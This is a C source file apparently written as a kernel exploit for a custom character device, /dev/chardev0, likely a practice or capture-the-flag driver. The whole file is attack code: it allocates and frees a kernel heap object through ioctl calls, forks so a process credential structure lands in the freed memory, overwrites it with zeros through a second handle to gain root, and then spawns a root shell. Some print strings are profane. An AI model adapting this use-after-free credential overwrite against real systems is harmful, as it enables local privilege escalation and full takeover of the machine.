#include <stdio.h>
#include <stdlib.h>
#include <fcntl.h>
#include <unistd.h>
#include <errno.h>
#include <string.h>
#include <sys/ioctl.h>
#include "chardev.h"

#define HEAP_SIZE 0xa8

int main(){

	int fd = open("/dev/chardev0", O_RDWR);

	if(fd < 0){
		printf("Can't open the character device.\n");
		return -1;
	}

	int fd1 = open("/dev/chardev0", O_RDWR);

	if(fd1 < 0){
		printf("Can't open the character device.\n");
		return -1;
	}

	if(ioctl(fd, KMALLOC, HEAP_SIZE) < 0){
		printf("KMALLOC problem!\n");
		return -1;
	}

	ioctl(fd, KFREE);

	if(close(fd) < 0)
	{
		printf("Can't close!\n");
		return -1;
	}

	int pid = fork();

	if(pid < 0){
		printf("Can't fork! I don't know why google it you fucking idiot!\n");
		return -1;
	}else if(pid == 0){

		printf("The PID is %d\n", pid);

		char overflow_cred[28] = {0};
		write(fd1, overflow_cred, 28);

		if(!getuid()){
			printf("You're root now! enjoy!\n");
			system("/bin/sh");
		}else{
			printf("Wrong uid %d try harder!\n", getuid());
		}

	}else{
		wait(1);
	
	}


	if(close(fd1) < 0){
		printf("FUUUUUCKKKK! Unable to close!");
		return -1;
	}



	return 0;
}
